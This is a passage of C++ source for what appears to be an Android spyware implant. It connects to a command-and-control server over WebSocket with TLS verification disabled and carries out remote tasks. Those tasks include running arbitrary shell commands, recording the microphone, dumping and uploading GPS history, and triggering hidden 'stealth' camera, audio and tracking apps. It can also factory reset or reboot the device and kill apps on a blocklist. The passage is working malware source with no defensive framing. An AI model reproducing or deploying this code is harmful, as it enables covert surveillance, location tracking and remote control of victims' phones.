    log_message("Dumping GPS history.");
    auto [location_ok, output] = exec_cmd(split_command_line("dumpsys location"));

    int fd = open(GPS_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    bool wrote_data = false;
    if (fd >= 0) {
        if (location_ok && !output.empty()) {
            write(fd, output.data(), output.size());
            write(fd, "\n", 1);
            wrote_data = true;
        }

        auto [radio_ok, log_output] = exec_cmd(split_command_line("logcat -d -b radio"));
        (void)radio_ok;
        size_t start = 0;
        while (start < log_output.size()) {
            size_t end = log_output.find('\n', start);
            size_t line_len = (end == std::string::npos) ? log_output.size() - start : end - start;
            size_t gps_pos = log_output.find("GpsLocation", start);
            if (gps_pos != std::string::npos && gps_pos < start + line_len) {
                write(fd, log_output.data() + start, line_len);
                write(fd, "\n", 1);
                wrote_data = true;
            }
            if (end == std::string::npos) break;
            start = end + 1;
        }
        close(fd);
    }

    if (!wrote_data) {
        unlink(GPS_FILE);
        send_error_to_server("gps_dump", "No GPS data collected from dumpsys or radio logs.");
        return;
    }

    log_message("GPS history dump finished.");
    upload_file(GPS_FILE);
}

/** Executes an arbitrary shell command requested by the C2 server and reports the output back. */
void do_shell_command(const std::string& shell_cmd) {
    if (shell_cmd.empty()) {
        send_error_to_server("shell_cmd", "Empty command received");
        return;
    }
    log_message("Executing remote shell command: " + shell_cmd);
    auto [success, result] = exec_cmd_shell(shell_cmd);
    if (!success) {
        send_error_to_server("shell_cmd", "Failed to execute remote shell command: " + shell_cmd);
    }
    if (result.empty()) {
        result = "[No output]";
    }

    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"command_result\":\"" + json_escape(result) + "\"}";
    if (!websocket_send_text(json_req)) {
        send_error_to_server("shell_cmd", "WS not open, cannot send result for: " + shell_cmd);
        return;
    }
    log_message("Remote shell command execution finished.");
}

/** Triggers an Android intent to factory reset the device. */
void do_factory_reset() {
    log_message("Factory reset requested by C2.");
    auto [success, result] = exec_cmd_shell("am broadcast -a android.intent.action.MASTER_CLEAR");
    bool permission_denied = result.find("Permission Denial") != std::string::npos || result.find("Permission denied") != std::string::npos;
    if (!success || permission_denied) {
        send_error_to_server("factory_reset", permission_denied ? "Command execution rejected by platform permissions." : "Factory reset command failed.");
        if (!success && result.empty()) {
            result = "[Factory reset command failed with no output]";
        }
    }
    if (result.empty()) {
        result = success ? "[Factory reset command executed successfully with no output]" : "[Factory reset command failed with no output]";
    }

    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"command_result\":\"" + json_escape(result) + "\"}";
    if (!websocket_send_text(json_req)) {
        send_error_to_server("factory_reset", "WS not open, cannot send result");
        return;
    }
    log_message("Factory reset command finished.");
}

// ── WebSocket Task Processing ────────────────────────────────────────────────

/** Processes all queued tasks received from the C2 server natively. */
void process_tasks() {
    std::vector<std::string> tasks;
    {
        std::lock_guard<std::mutex> lock(g_taskMutex);
        tasks.reserve(g_taskQueue.size()); // Pre-allocate vector capacity
        while (!g_taskQueue.empty()) {
            // std::move prevents allocating and copying the JSON payload again
            tasks.push_back(std::move(g_taskQueue.front()));
            g_taskQueue.pop();
        }
    }
    
    if (tasks.empty()) return;
    log_message("Processing " + std::to_string(tasks.size()) + " queued C2 tasks.");

    for (const auto& response : tasks) {
        std::string task = get_json_val(response, "task");
        if (task == "mic_record") {
            int duration = 0;
            try {
                duration = std::stoi(get_json_val(response, "duration"));
            } catch (const std::exception&) {}
            std::thread([duration]() { do_mic_record(duration); }).detach(); // Async
        } else if (task == "gps_dump") {
            std::thread([]() { do_gps_dump(); }).detach(); // Async
        } else if (task == "shell") {
            std::string cmd = get_json_val(response, "command");
            std::thread([cmd]() { do_shell_command(cmd); }).detach(); // Async
        } else if (task == "report") {
            log_message("Explicit report requested by C2 (will be handled by main loop).");
        } else if (task == "update_blocked_apps") {
            std::string apps_str = get_json_val(response, "apps");
            std::vector<std::string> apps;
            size_t start = 0;
            while (start < apps_str.size()) {
                size_t comma = apps_str.find(',', start);
                std::string item = apps_str.substr(start, comma == std::string::npos ? std::string::npos : comma - start);
                if (!item.empty() && item != " ") {
                    apps.push_back(item);
                }
                if (comma == std::string::npos) break;
                start = comma + 1;
            }
            {
                std::lock_guard<std::mutex> lock(g_forbiddenMutex);
                g_forbiddenApps = apps;
            }
            g_forbiddenCV.notify_one(); // Wake blocker thread if it was waiting for apps
            log_message("Updated blocked apps list: " + std::to_string(apps.size()) + " apps blocked.");
        } else if (task == "set_location") {
            int track = 0;
            try { track = std::stoi(get_json_val(response, "track")); } catch(...) {}
            set_location_file(track);
            log_message("Location tracking set to: " + std::to_string(track));
            if (track == 1) {
                int interval = g_ping_interval.load();
                std::string cmd = "am startservice --el interval " + std::to_string(interval * 1000) + " com.stealthgps/.GpsService";
                std::thread([cmd]() { exec_cmd(split_command_line(cmd)); }).detach();
            } else {
                std::thread([]() { exec_cmd(split_command_line("am force-stop com.stealthgps")); }).detach();
            }
        } else if (task == "check_location_state") {
            log_message("Reporting location state explicitly (will be handled by main loop).");
        } else if (task == "factory_reset") {
            std::thread([]() { do_factory_reset(); }).detach(); // Async, because this may reboot the device
        } else if (task == "refresh_installed_apps") {
            log_message("Refreshing installed apps on-demand.");
            g_installed_apps_dirty = true;
        } else if (task == "set_interval") {
            int interval = g_ping_interval.load();
            try { interval = std::stoi(get_json_val(response, "interval")); } catch(...) {}
            if (interval < 1) {
                interval = 1;
            }
            g_ping_interval.store(interval);
            if (!save_ping_interval_to_file(interval)) {
                send_error_to_server("set_interval", "Failed to persist ping interval");
            }
            log_message("Ping interval updated to: " + std::to_string(g_ping_interval.load()));
            if (is_location_enabled()) {
                std::string cmd = "am startservice --el interval " + std::to_string(interval * 1000) + " com.stealthgps/.GpsService";
                std::thread([cmd]() { exec_cmd(split_command_line(cmd)); }).detach();
            }
        } else if (task == "system_alert") {
            std::string state = get_json_val(response, "state");
            std::string text = get_json_val(response, "text");
            log_message("System alert received: state=" + state + " text=" + text);
            if (!state.empty() || !text.empty()) {
                std::vector<std::string> args = {"am", "start", "-n", "com.stealthalert/.AlertActivity", "--es", "title", state, "--es", "text", text};
                bool started = run_command_no_output(args);
                if (!started) {
                    send_error_to_server("system_alert", "Failed to launch StealthAlert activity");
                }
                log_message(std::string("StealthAlert activity ") + (started ? "started" : "failed to start"));
            } else {
                send_error_to_server("system_alert", "Empty state and text received");
            }
        } else if (task == "audio_blast") {
            std::string play = get_json_val(response, "play");
            log_message("Audio blast request received: play=" + play);
            if (play == "1") {
                std::vector<std::string> args = {"am", "broadcast", "-n", "com.stealthaudio/.StealthAudioReceiver", "--es", "action", "play", "--es", "volume", play};
                bool started = run_command_no_output(args);
                if (!started) {
                    send_error_to_server("audio_blast", "Failed to launch StealthAudio activity");
                }
                log_message(std::string("StealthAudio activity ") + (started ? "started" : "failed to start"));
            } else if (play == "0") {
                std::vector<std::string> args = {"am", "force-stop", "com.stealthaudio"};
                run_command_no_output(args);
                log_message("Audio blast stopped via force-stop");
            } else {
                send_error_to_server("audio_blast", "Empty play value received");
            }
        } else if (task == "power_cmd") {
            std::string action = get_json_val(response, "action");
            log_message("Power command received: action=" + action);
            if (action == "reboot") {
                std::thread([]() {
                    log_message("Executing reboot command...");
                    exec_cmd(split_command_line("reboot"));
                }).detach();
            } else if (action == "shutdown") {
                std::thread([]() {
                    log_message("Executing shutdown command...");
                    exec_cmd(split_command_line("reboot -p"));
                }).detach();
            }
        } else if (task == "force_selfie") {
            log_message("Force selfie request received");
            std::vector<std::string> args = {"am", "start", "-n", "com.stealthselfie/.MainActivity"};
            bool started = run_command_no_output(args);
            if (!started) {
                send_error_to_server("force_selfie", "Failed to launch StealthSelfie activity");
            }
            log_message(std::string("StealthSelfie activity ") + (started ? "started" : "failed to start"));
        } else if (!task.empty()) {
            send_error_to_server("task_dispatch", "Unknown task received: " + task);
        }
    }
}

// ── Main Entry Point ─────────────────────────────────────────────────────────

/** Main daemon process: initializes networking, caches identity, daemonizes, and enters the event loop. */
int main(int argc, char* argv[]) {
    (void)argc;
    (void)argv;
    // Open log file if enabled
    if (ENABLE_FILE_LOGGING) {
        g_log_file = fopen(LOG_PATH, "a");
        if (g_log_file) {
            fseek(g_log_file, 0, SEEK_END);
            g_log_size = static_cast<size_t>(ftell(g_log_file));
        }
    }

    // Cache constant device metadata to avoid repeated sysprop lookups
    g_device_id = get_serialno();
    g_build_id = get_build_id();
    g_build_version = get_build_version();
    g_build_type = get_build_type();
    g_device_name = get_device_name();

    log_message("Reporter starting up.");

    // Pre-escape constant strings once — avoids per-report allocations
    g_escaped_implant_key = json_escape(IMPLANT_KEY);
    g_escaped_device_id = json_escape(g_device_id);
    g_escaped_build_id = json_escape(g_build_id);
    g_escaped_build_version = json_escape(g_build_version);
    g_escaped_build_type = json_escape(g_build_type);
    g_escaped_device_name = json_escape(g_device_name);

    // Init IXWebSocket
    ix::initNetSystem();

    // Ensure coords.txt exists with 0666 permissions so GpsService can write to it
    int fd = open("/data/local/tmp/coords.txt", O_WRONLY | O_CREAT, 0666);
    if (fd >= 0) {
        close(fd);
        chmod("/data/local/tmp/coords.txt", 0666);
    }

    int interval = load_ping_interval_from_file(g_ping_interval.load());
    g_ping_interval.store(interval);
    log_message("Ping interval loaded from file: " + std::to_string(interval));

    // Start GPS service on startup if enabled
    if (is_location_enabled()) {
        std::thread([]() {
            std::string launch = "am startservice --el interval " + std::to_string(g_ping_interval.load() * 1000) + " com.stealthgps/.GpsService";
            exec_cmd(split_command_line(launch));
        }).detach();
    }

    std::string ws_url = DEFAULT_WS_SERVER_URL;
    std::ifstream url_file(C2_URL_FILE);
    if (url_file.is_open()) {
        std::string line;
        if (std::getline(url_file, line) && !line.empty()) {
            ws_url = line;
            ws_url.erase(std::find_if(ws_url.rbegin(), ws_url.rend(), [](unsigned char ch) {
                return !std::isspace(ch);
            }).base(), ws_url.end());
            log_message("Using custom C2 URL from file: " + ws_url);
        }
    } else {
        log_message(std::string("Using default C2 URL: ") + ws_url);
    }
    
    g_webSocket.setUrl(ws_url);
    g_webSocket.setPingInterval(45);
    g_webSocket.enableAutomaticReconnection();

    // Disable TLS peer verification — Android's system_server context does not
    // have access to the normal CA store, so wss:// handshakes silently fail.
    ix::SocketTLSOptions tlsOptions;
    tlsOptions.disable_hostname_validation = true;
    tlsOptions.caFile = "NONE"; // Bypass CA bundle lookup entirely
    g_webSocket.setTLSOptions(tlsOptions);

    
    g_webSocket.setOnMessageCallback([](const ix::WebSocketMessagePtr& msg) {
        if (msg->type == ix::WebSocketMessageType::Message) {
            log_message("WS Command Received.");
            {
                std::lock_guard<std::mutex> lock(g_taskMutex);
                g_taskQueue.push(msg->str);
            }
            g_taskCV.notify_one(); // Wake up main thread instantly
        } else if (msg->type == ix::WebSocketMessageType::Open) {
            log_message("WS Connection open");
        } else if (msg->type == ix::WebSocketMessageType::Error) {
            log_message("WS Connection error: " + msg->errorInfo.reason);
        }
    });
    g_webSocket.start();

    // Main loop
    // Start app blocker thread
    std::thread([]() {
        char path[256];
        char cmdline[256];
        while (true) {
            std::unique_lock<std::mutex> lock(g_forbiddenMutex);
            
            if (g_forbiddenApps.empty()) {
                g_forbiddenCV.wait(lock, []{ return !g_forbiddenApps.empty(); });
            }
            
            std::vector<std::string> current_apps = g_forbiddenApps;
            lock.unlock();
            
            // Read all running processes once per cycle
            std::vector<std::string> running_processes;
            DIR* dir = opendir("/proc");
            if (dir) {
                struct dirent* ent;
                while ((ent = readdir(dir)) != nullptr) {
                    if (!isdigit(ent->d_name[0])) continue;
                    snprintf(path, sizeof(path), "/proc/%s/cmdline", ent->d_name);
                    int fd = open(path, O_RDONLY);
                    if (fd >= 0) {
                        ssize_t bytes = read(fd, cmdline, sizeof(cmdline) - 1);
                        if (bytes > 0) {
                            cmdline[bytes] = '\0';
                            running_processes.emplace_back(cmdline);
                        }
                        close(fd);
                    }
                }
                closedir(dir);
            }

            for (const auto& pkg : current_apps) {
                bool running = false;
                std::string pkg_prefix = pkg + ":";
                for (const auto& proc : running_processes) {
                    if (proc == pkg || proc.rfind(pkg_prefix, 0) == 0) {
                        running = true;
                        break;
                    }
                }
                if (running) {
                    run_command_no_output({"am", "force-stop", pkg});
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    }).detach();

    // Wait up to 5 seconds for WS to connect before firing first report
    for(int i=0; i<50; i++) {
        if (g_webSocket.getReadyState() == ix::ReadyState::Open) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    while (true) {
        if (access(DISABLE_FILE, F_OK) == 0) {
            std::this_thread::sleep_for(std::chrono::seconds(10));
            continue;
        }
        
        do_report();
        
        // Sleep until we get a notification from websocket, or max ping interval
        int interval = std::max(1, g_ping_interval.load());
        std::unique_lock<std::mutex> lock(g_taskMutex);
        g_taskCV.wait_for(lock, std::chrono::seconds(interval), []{ return !g_taskQueue.empty(); });
        lock.unlock(); // Unlock before processing to prevent deadlocks
        
        process_tasks();
    }

    log_message("Reporter shutting down.");
    g_webSocket.stop();
    ix::uninitNetSystem();

    if (g_log_file) {
        fclose(g_log_file);
    }

    return 0;
}
